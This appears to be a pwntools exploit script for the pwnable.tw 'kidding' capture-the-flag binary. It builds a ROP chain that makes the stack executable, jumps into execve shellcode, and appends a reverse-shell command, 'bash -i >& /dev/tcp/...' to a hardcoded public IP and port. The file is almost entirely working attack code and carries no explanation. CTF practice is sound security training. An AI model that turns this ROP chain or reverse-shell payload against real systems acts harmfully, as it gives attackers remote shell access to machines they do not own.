#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata, senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata, timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

elf = ELF('./kidding')

context.binary = elf

local = 1
if local:
    p = process([elf.path])
else:
    p = remote('chall.pwnable.tw', 10303)

dl_make_stack_executable = elf.sym['_dl_make_stack_executable']
pop_eax_ret = 0x080b8536
pop_ecx_ret = 0x080583c9
# 0x0804b5eb : pop dword ptr [ecx] ; ret
pop_pecx_ret = 0x0804b5eb
jmp_esp = 0x080bd13b
libc_stack_end = 0x80e9fc8
stack_prot = 0x80e9fec

cmd = ';bash -i >& /dev/tcp/47.93.220.24/2333 0>&1\x00'
sh = '''
    mov al, 0xb
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80
'''
info('len(sh) = ' + str(len(asm(sh).decode(ENCODING))))

gdb.attach(p)

#payload = 'A' * 0x8 + up32(0xcafebabe) + up32(0xdeadbeef)
payload = (
    'A' * 0x8 + up32(0xcafebabe) + 
    up32(pop_ecx_ret) + up32(stack_prot) + up32(pop_pecx_ret) + up32(7) + 
    up32(pop_eax_ret) + up32(libc_stack_end) + up32(dl_make_stack_executable) + 
    up32(jmp_esp)
)
payload += asm(sh).decode(ENCODING)
payload += cmd
s(payload)

p.interactive()

